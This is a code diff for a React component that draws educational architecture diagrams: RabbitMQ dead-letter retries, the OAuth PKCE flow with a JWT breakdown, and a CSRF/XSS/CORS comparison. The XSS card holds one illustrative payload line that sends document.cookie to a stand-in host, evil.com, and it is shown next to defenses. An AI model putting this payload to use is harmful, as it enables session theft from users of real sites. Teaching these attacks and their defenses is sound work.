-              RabbitMQ is a smart message broker. Producers publish to an <strong>Exchange</strong>, which routes messages to <strong>Queues</strong> based on bindings and routing keys. Messages are deleted from the queue once consumed (ACK'd).
+              RabbitMQ is a smart message broker. Producers publish to an <strong>Exchange</strong>, which routes messages to <strong>Queues</strong> based on bindings and routing keys. Messages are deleted from the queue once consumed (ACK&apos;d).
             </p>
             
             <div className="flex flex-col items-center max-w-4xl mx-auto">
               {/* Producer */}
               <div className="bg-slate-100 border-2 border-slate-300 p-3 rounded-xl shadow-sm z-10 w-48 text-center">
                  <div className="font-bold text-slate-700">Producer</div>
-                 <div className="text-[10px] text-slate-500 mt-1">Routing Key: "order.eu"</div>
+                 <div className="text-[10px] text-slate-500 mt-1">Routing Key: &quot;order.eu&quot;</div>
               </div>
               
               <div className="h-8 w-1 bg-slate-300 relative">
@@ -611,7 +244,7 @@ export function VisualsView() {
               {/* Exchange */}
               <div className="bg-fuchsia-50 border-2 border-fuchsia-300 rounded-full w-48 h-24 flex flex-col items-center justify-center shadow-md z-10 relative">
                  <div className="font-bold text-fuchsia-800">Topic Exchange</div>
-                 <div className="text-[10px] text-fuchsia-600">"orders.exchange"</div>
+                 <div className="text-[10px] text-fuchsia-600">&quot;orders.exchange&quot;</div>
               </div>
               
               {/* Bindings */}
@@ -624,7 +257,7 @@ export function VisualsView() {
                       <polygon points="10%,100% 8%,90% 12%,90%" fill="#94a3b8" />
                     </svg>
                     <div className="bg-white border border-fuchsia-200 text-fuchsia-700 text-[10px] px-2 py-1 rounded-full absolute -top-8 left-[10%] -translate-x-1/2 shadow-sm font-mono font-bold">
-                       Binding: "order.eu"
+                       Binding: &quot;order.eu&quot;
                     </div>
                  </div>
                  
@@ -635,7 +268,7 @@ export function VisualsView() {
                       <polygon points="90%,100% 88%,90% 92%,90%" fill="#94a3b8" />
                     </svg>
                     <div className="bg-white border border-fuchsia-200 text-fuchsia-700 text-[10px] px-2 py-1 rounded-full absolute -top-8 right-[10%] translate-x-1/2 shadow-sm font-mono font-bold">
-                       Binding: "order.us"
+                       Binding: &quot;order.us&quot;
                     </div>
                  </div>
                  
@@ -684,6 +317,99 @@ export function VisualsView() {
           </div>
         </section>
 
+        {/* RabbitMQ Advanced Resiliency: DLX, Retry Queue & DLQ */}
+        <section>
+          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
+            <RefreshCw className="w-6 h-6 text-rose-600" /> RabbitMQ Resiliency: DLX &amp; Exponential Retry Architecture
+          </h2>
+          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
+            <p className="text-sm text-slate-600 mb-6">
+              When processing fails, the consumer rejects the message with <code>basicNack(deliveryTag, false, false)</code>. RabbitMQ forwards it to a <strong>Dead Letter Exchange (DLX)</strong>, holding it in a delayed <strong>Retry Queue (TTL)</strong> before re-attempting processing, and finally quarantining poisoned messages in the <strong>DLQ</strong>.
+            </p>
+
+            <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 relative max-w-4xl mx-auto overflow-x-auto">
+              <div className="min-w-[750px] flex flex-col gap-6">
+                
+                {/* Step 1: Main Flow */}
+                <div className="flex items-center justify-between gap-4">
+                  <div className="bg-indigo-50 border-2 border-indigo-300 p-3 rounded-xl w-36 text-center shadow-sm">
+                    <div className="text-xs font-bold text-indigo-900">Publisher</div>
+                    <div className="text-[9px] text-indigo-600 mt-1">ConfirmCallback (ACK/NACK)</div>
+                  </div>
+
+                  <div className="flex items-center text-slate-400 text-xs font-mono">
+                    <span className="bg-white px-2 py-0.5 border rounded text-[10px]">publish</span>
+                    <ArrowRight className="w-4 h-4 ml-1" />
+                  </div>
+
+                  <div className="bg-purple-50 border-2 border-purple-300 p-3 rounded-xl w-40 text-center shadow-sm">
+                    <div className="text-xs font-bold text-purple-900">Main Topic Exchange</div>
+                    <div className="text-[9px] text-purple-600 font-mono mt-1">payment.exchange</div>
+                  </div>
+
+                  <div className="flex items-center text-slate-400 text-xs font-mono">
+                    <ArrowRight className="w-4 h-4" />
+                  </div>
+
+                  <div className="bg-green-50 border-2 border-green-300 p-3 rounded-xl w-44 text-center shadow-sm">
+                    <div className="text-xs font-bold text-green-900">Main Queue</div>
+                    <div className="text-[9px] text-green-700 font-mono mt-1">x-dead-letter-exchange</div>
+                  </div>
+
+                  <div className="flex items-center text-slate-400 text-xs font-mono">
+                    <ArrowRight className="w-4 h-4" />
+                  </div>
+
+                  <div className="bg-blue-50 border-2 border-blue-300 p-3 rounded-xl w-36 text-center shadow-sm">
+                    <div className="text-xs font-bold text-blue-900">Consumer</div>
+                    <div className="text-[9px] text-rose-600 font-bold mt-1">Throws Exception!</div>
+                  </div>
+                </div>
+
+                {/* Step 2: Failure & DLX Routing */}
+                <div className="border-t-2 border-dashed border-rose-200 pt-4 grid grid-cols-3 gap-6 items-center">
+                  
+                  <div className="bg-rose-50 border-2 border-rose-300 p-3 rounded-xl text-center shadow-sm">
+                    <div className="text-xs font-bold text-rose-900 flex items-center justify-center gap-1">
+                      <AlertTriangle className="w-3.5 h-3.5 text-rose-600" /> DLX (Dead Letter Exchange)
+                    </div>
+                    <div className="text-[9px] text-rose-700 mt-1">Direct Exchange: &quot;payment.dlx&quot;</div>
+                  </div>
+
+                  <div className="bg-amber-50 border-2 border-amber-300 p-3 rounded-xl text-center shadow-sm relative">
+                    <div className="absolute -top-2.5 left-1/2 -translate-x-1/2 bg-amber-200 text-amber-900 text-[9px] font-bold px-2 py-0.5 rounded-full">
+                      Delayed Retry (5000ms TTL)
+                    </div>
+                    <div className="text-xs font-bold text-amber-900 mt-2">Retry Delay Queue</div>
+                    <div className="text-[9px] text-amber-700 mt-1">No Consumers attached. Message expires &gt; routes back to Main Exchange.</div>
+                  </div>
+
+                  <div className="bg-red-100 border-2 border-red-400 p-3 rounded-xl text-center shadow-md">
+                    <div className="text-xs font-bold text-red-900 flex items-center justify-center gap-1">
+                      <ShieldAlert className="w-3.5 h-3.5 text-red-600" /> Poison DLQ (Quarantine)
+                    </div>
+                    <div className="text-[9px] text-red-700 mt-1">Max Retries Exceeded (3x). Alert sent to PagerDuty/Slack for triage.</div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+            
+            <div className="mt-4 grid grid-cols-3 gap-3 text-center text-xs">
+              <div className="bg-slate-50 p-2 rounded border border-slate-200">
+                <span className="font-bold text-slate-800">1. Non-blocking Retries:</span> Unhealthy messages do not block healthy traffic.
+              </div>
+              <div className="bg-slate-50 p-2 rounded border border-slate-200">
+                <span className="font-bold text-slate-800">2. Exponential Backoff:</span> Increases delay (5s, 30s, 5m) via x-death header.
+              </div>
+              <div className="bg-slate-50 p-2 rounded border border-slate-200">
+                <span className="font-bold text-slate-800">3. DLQ Replay:</span> Messages can be replayed after fixing downstream bugs.
+              </div>
+            </div>
+          </div>
+        </section>
+
         {/* Kafka Architecture */}
         <section>
           <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
@@ -699,16 +425,16 @@ export function VisualsView() {
               <div className="flex flex-col justify-center gap-4">
                 <div className="bg-white border-2 border-slate-300 p-3 rounded-xl text-center shadow-sm">
                   <div className="font-bold text-slate-700 text-sm">Producer A</div>
-                  <div className="text-[10px] text-slate-500 mt-1">Key: "user-123"</div>
+                  <div className="text-[10px] text-slate-500 mt-1">Key: &quot;user-123&quot;</div>
                 </div>
                 <div className="bg-white border-2 border-slate-300 p-3 rounded-xl text-center shadow-sm">
                   <div className="font-bold text-slate-700 text-sm">Producer B</div>
-                  <div className="text-[10px] text-slate-500 mt-1">Key: "user-456"</div>
+                  <div className="text-[10px] text-slate-500 mt-1">Key: &quot;user-456&quot;</div>
                 </div>
               </div>
               
               <div className="flex-1 bg-orange-50 border-2 border-orange-200 rounded-xl p-4 relative shadow-sm">
-                 <div className="text-xs font-bold text-orange-800 absolute -top-3 left-1/2 -translate-x-1/2 bg-orange-100 px-3 py-1 rounded shadow-sm">Kafka Topic: "orders"</div>
+                 <div className="text-xs font-bold text-orange-800 absolute -top-3 left-1/2 -translate-x-1/2 bg-orange-100 px-3 py-1 rounded shadow-sm">Kafka Topic: &quot;orders&quot;</div>
                  
                  <div className="space-y-4 mt-2">
                    <div className="bg-white border border-orange-300 p-2 rounded flex items-center">
@@ -755,6 +481,228 @@ export function VisualsView() {
           </div>
         </section>
 
+        {/* OAuth 2.0 & OpenID Connect Architecture */}
+        <section>
+          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
+            <KeyRound className="w-6 h-6 text-sky-600" /> OAuth 2.0 Auth Code Flow with PKCE &amp; Okta IdP
+          </h2>
+          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
+            <p className="text-sm text-slate-600 mb-6">
+              Modern Single-Page Applications (React/Angular) authenticate users via an <strong>Identity Provider (Okta / Keycloak)</strong> using the <strong>Authorization Code Grant with PKCE</strong>. The Spring Boot Resource Server verifies the JWT signature statelessly via cached JWKS keys.
+            </p>
+
+            <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 max-w-4xl mx-auto overflow-x-auto">
+              <div className="min-w-[760px] space-y-6">
+                
+                {/* Actors Header */}
+                <div className="grid grid-cols-4 gap-4 text-center">
+                  <div className="bg-white border-2 border-slate-300 p-2.5 rounded-xl shadow-sm">
+                    <div className="font-bold text-xs text-slate-800">User / Browser</div>
+                    <div className="text-[9px] text-slate-500">Resource Owner</div>
+                  </div>
+                  <div className="bg-sky-50 border-2 border-sky-300 p-2.5 rounded-xl shadow-sm">
+                    <div className="font-bold text-xs text-sky-900">SPA Frontend (React)</div>
+                    <div className="text-[9px] text-sky-600">Public OAuth Client</div>
+                  </div>
+                  <div className="bg-purple-50 border-2 border-purple-300 p-2.5 rounded-xl shadow-sm">
+                    <div className="font-bold text-xs text-purple-900">Okta IdP</div>
+                    <div className="text-[9px] text-purple-600">Authorization Server</div>
+                  </div>
+                  <div className="bg-emerald-50 border-2 border-emerald-300 p-2.5 rounded-xl shadow-sm">
+                    <div className="font-bold text-xs text-emerald-900">Spring Boot API</div>
+                    <div className="text-[9px] text-emerald-600">Resource Server</div>
+                  </div>
+                </div>
+
+                {/* Sequence Steps */}
+                <div className="space-y-3 text-xs">
+                  {/* Step 1 */}
+                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
+                    <div className="flex items-center gap-3">
+                      <span className="w-5 h-5 bg-sky-100 text-sky-800 rounded-full font-bold flex items-center justify-center text-[10px]">1</span>
+                      <span className="font-semibold text-slate-800">Generate PKCE Pair</span>
+                    </div>
+                    <span className="text-slate-600 text-[11px] font-mono">code_verifier + code_challenge = SHA256(verifier)</span>
+                  </div>
+
+                  {/* Step 2 */}
+                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
+                    <div className="flex items-center gap-3">
+                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">2</span>
+                      <span className="font-semibold text-slate-800">Redirect to Okta Login</span>
+                    </div>
+                    <span className="text-slate-600 text-[11px] font-mono">GET /oauth2/v1/authorize?code_challenge=...&amp;response_type=code</span>
+                  </div>
+
+                  {/* Step 3 */}
+                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
+                    <div className="flex items-center gap-3">
+                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">3</span>
+                      <span className="font-semibold text-slate-800">Okta Issues Auth Code</span>
+                    </div>
+                    <span className="text-slate-600 text-[11px] font-mono">Redirects to SPA with ?code=auth_code_xyz</span>
+                  </div>
+
+                  {/* Step 4 */}
+                  <div className="bg-white p-3 rounded-lg border border-slate-200 flex items-center justify-between shadow-sm">
+                    <div className="flex items-center gap-3">
+                      <span className="w-5 h-5 bg-purple-100 text-purple-800 rounded-full font-bold flex items-center justify-center text-[10px]">4</span>
+                      <span className="font-semibold text-slate-800">Exchange Code + Verifier</span>
+                    </div>
+                    <span className="text-slate-600 text-[11px] font-mono">POST /token (code + plain code_verifier) &gt; Okta returns JWT Access Token</span>
+                  </div>
+
+                  {/* Step 5 */}
+                  <div className="bg-white p-3 rounded-lg border border-emerald-200 flex items-center justify-between shadow-sm bg-emerald-50/50">
+                    <div className="flex items-center gap-3">
+                      <span className="w-5 h-5 bg-emerald-100 text-emerald-800 rounded-full font-bold flex items-center justify-center text-[10px]">5</span>
+                      <span className="font-semibold text-slate-800">Access API with Bearer JWT</span>
+                    </div>
+                    <span className="text-emerald-700 text-[11px] font-mono">Authorization: Bearer &lt;JWT&gt;</span>
+                  </div>
+
+                  {/* Step 6 */}
+                  <div className="bg-white p-3 rounded-lg border border-emerald-200 flex items-center justify-between shadow-sm bg-emerald-50/50">
+                    <div className="flex items-center gap-3">
+                      <span className="w-5 h-5 bg-emerald-100 text-emerald-800 rounded-full font-bold flex items-center justify-center text-[10px]">6</span>
+                      <span className="font-semibold text-slate-800">Spring Security JWT Validation</span>
+                    </div>
+                    <span className="text-emerald-700 text-[11px]">Validates RS256 Signature via cached JWKS + Checks exp &amp; scopes</span>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+
+            {/* JWT Breakdown */}
+            <div className="mt-6 border border-slate-200 rounded-xl p-4 bg-slate-50">
+              <div className="text-xs font-bold text-slate-800 mb-2 flex items-center gap-1.5">
+                <Key className="w-4 h-4 text-amber-600" /> Anatomical Structure of a JSON Web Token (JWT)
+              </div>
+              <div className="grid grid-cols-3 gap-3 text-xs">
+                <div className="bg-rose-50 border border-rose-200 p-2.5 rounded-lg">
+                  <div className="font-bold text-rose-800 font-mono text-[11px]">1. Header (Base64Url)</div>
+                  <div className="text-[10px] text-rose-700 mt-1 font-mono">{`{"alg": "RS256", "kid": "okta-key-1"}`}</div>
+                </div>
+                <div className="bg-purple-50 border border-purple-200 p-2.5 rounded-lg">
+                  <div className="font-bold text-purple-800 font-mono text-[11px]">2. Payload (Claims)</div>
+                  <div className="text-[10px] text-purple-700 mt-1 font-mono">{`{"sub": "usr_99", "roles": ["ADMIN"], "exp": 172000}`}</div>
+                </div>
+                <div className="bg-sky-50 border border-sky-200 p-2.5 rounded-lg">
+                  <div className="font-bold text-sky-800 font-mono text-[11px]">3. Signature</div>
+                  <div className="text-[10px] text-sky-700 mt-1 font-mono">RSASHA256(header.payload, privateKey)</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        {/* Web Security Triad: CSRF vs XSS vs CORS */}
+        <section>
+          <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
+            <Shield className="w-6 h-6 text-violet-600" /> Web Security Triad: CSRF vs XSS vs CORS
+          </h2>
+          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
+            <p className="text-sm text-slate-600 mb-6">
+              A side-by-side comparison of the three fundamental web application security mechanisms, their browser execution rules, and Spring Boot / enterprise defenses.
+            </p>
+
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+              
+              {/* CSRF Card */}
+              <div className="bg-rose-50/50 border-2 border-rose-200 rounded-2xl p-5 flex flex-col justify-between shadow-sm">
+                <div>
+                  <div className="flex items-center justify-between mb-3">
+                    <span className="font-bold text-rose-900 text-base">CSRF</span>
+                    <span className="text-[10px] bg-rose-200 text-rose-800 font-bold px-2 py-0.5 rounded-full">Request Forgery</span>
+                  </div>
+                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Site Request Forgery</h4>
+                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
+                    Attacker tricks authenticated browser into submitting unauthorized POST/PUT requests using the victim&apos;s auto-attached session cookies.
+                  </p>
+                  
+                  <div className="bg-white border border-rose-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
+                    <div className="font-bold text-rose-800">Attack Vector:</div>
+                    <div className="text-slate-600 font-mono">&lt;form action=&quot;bank.com/transfer&quot;&gt;</div>
+                  </div>
+                </div>
+
+                <div className="border-t border-rose-200 pt-3">
+                  <div className="text-[11px] font-bold text-rose-900 mb-1.5 flex items-center gap-1">
+                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Enterprise Defenses:
+                  </div>
+                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
+                    <li><code>SameSite=Strict/Lax</code> cookies</li>
+                    <li>Synchronizer CSRF Token header (<code>X-XSRF-TOKEN</code>)</li>
+                    <li>Stateless Bearer JWT APIs (immune)</li>
+                  </ul>
+                </div>
+              </div>
+
+              {/* XSS Card */}
+              <div className="bg-amber-50/50 border-2 border-amber-200 rounded-2xl p-5 flex flex-col justify-between shadow-sm">
+                <div>
+                  <div className="flex items-center justify-between mb-3">
+                    <span className="font-bold text-amber-900 text-base">XSS</span>
+                    <span className="text-[10px] bg-amber-200 text-amber-800 font-bold px-2 py-0.5 rounded-full">Code Injection</span>
+                  </div>
+                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Site Scripting</h4>
+                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
+                    Attacker injects malicious JavaScript (Stored, Reflected, or DOM) that executes within the victim&apos;s browser origin to steal cookies or manipulate the page.
+                  </p>
+                  
+                  <div className="bg-white border border-amber-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
+                    <div className="font-bold text-amber-800">Attack Vector:</div>
+                    <div className="text-slate-600 font-mono">&lt;script&gt;fetch(&quot;evil.com/&quot;+document.cookie)&lt;/script&gt;</div>
+                  </div>
+                </div>
+
+                <div className="border-t border-amber-200 pt-3">
+                  <div className="text-[11px] font-bold text-amber-900 mb-1.5 flex items-center gap-1">
+                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Enterprise Defenses:
+                  </div>
+                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
+                    <li><code>HttpOnly</code> cookie flag (blocks JS access)</li>
+                    <li>Content Security Policy (CSP headers)</li>
+                    <li>Context-aware encoding &amp; Jsoup sanitization</li>
+                  </ul>
+                </div>
+              </div>
+
+              {/* CORS Card */}
+              <div className="bg-sky-50/50 border-2 border-sky-200 rounded-2xl p-5 flex flex-col justify-between shadow-sm">
+                <div>
+                  <div className="flex items-center justify-between mb-3">
+                    <span className="font-bold text-sky-900 text-base">CORS</span>
+                    <span className="text-[10px] bg-sky-200 text-sky-800 font-bold px-2 py-0.5 rounded-full">Browser SOP Policy</span>
+                  </div>
+                  <h4 className="text-xs font-bold text-slate-700 mb-2">Cross-Origin Resource Sharing</h4>
+                  <p className="text-[11px] text-slate-600 mb-4 leading-relaxed">
+                    Browser security mechanism that blocks JavaScript on Origin A from reading responses from Origin B unless server explicitly grants permission via HTTP headers.
+                  </p>
+                  
+                  <div className="bg-white border border-sky-200 rounded-lg p-2.5 mb-3 text-[10px] space-y-1">
+                    <div className="font-bold text-sky-800">Preflight Trigger:</div>
+                    <div className="text-slate-600 font-mono">OPTIONS + Content-Type: application/json</div>
+                  </div>
+                </div>
+
+                <div className="border-t border-sky-200 pt-3">
+                  <div className="text-[11px] font-bold text-sky-900 mb-1.5 flex items-center gap-1">
+                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" /> Spring Boot Config:
+                  </div>
+                  <ul className="text-[10px] text-slate-700 space-y-1 list-disc pl-4">
+                    <li><code>CorsConfigurationSource</code> Bean</li>
+                    <li>Explicit allowed origins (No <code>*</code> with credentials)</li>
+                    <li>Exposed response headers (<code>X-Total-Count</code>)</li>
+                  </ul>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </section>
+
         {/* AWS Architecture */}
         <section>
           <h2 className="text-2xl font-bold text-slate-900 mb-4 flex items-center gap-2">
@@ -770,7 +718,7 @@ export function VisualsView() {
               {/* Client -> Route53 -> CloudFront */}
               <div className="flex justify-center items-center gap-4 mb-8">
                 <div className="bg-white border border-slate-300 p-3 rounded shadow-sm text-center">
-                  <div className="text-xs font-bold text-slate-700">Client Client</div>
+                  <div className="text-xs font-bold text-slate-700">Client Browser</div>
                 </div>
                 <div className="text-slate-400 font-mono text-[10px]">HTTPS</div>
                 <div className="bg-sky-50 border border-sky-300 p-3 rounded shadow-sm text-center">
@@ -780,7 +728,7 @@ export function VisualsView() {
                 <div className="text-slate-400 font-mono text-[10px]">-&gt;</div>
                 <div className="bg-sky-50 border border-sky-300 p-3 rounded shadow-sm text-center">
                   <div className="text-sm font-bold text-sky-800">CloudFront</div>
-                  <div className="text-[10px] text-sky-600">CDN & Edge Cache</div>
+                  <div className="text-[10px] text-sky-600">CDN &amp; Edge Cache</div>
                 </div>
               </div>
               
@@ -820,7 +768,7 @@ export function VisualsView() {
               
               {/* Storage Layer */}
               <div className="border border-dashed border-slate-300 rounded-lg p-4 bg-white relative">
-                <div className="absolute -top-3 left-4 bg-slate-200 text-slate-800 text-xs font-bold px-2 py-0.5 rounded">Storage & Data</div>
+                <div className="absolute -top-3 left-4 bg-slate-200 text-slate-800 text-xs font-bold px-2 py-0.5 rounded">Storage &amp; Data</div>
                 <div className="grid grid-cols-3 gap-4 pt-2">
                   <div className="bg-blue-50 border border-blue-300 p-3 rounded shadow-sm text-center">
                     <div className="text-sm font-bold text-blue-800">DynamoDB</div>
@@ -840,7 +788,6 @@ export function VisualsView() {
             </div>
           </div>
         </section>
-
 
         {/* CI/CD Pipeline */}
         <section>
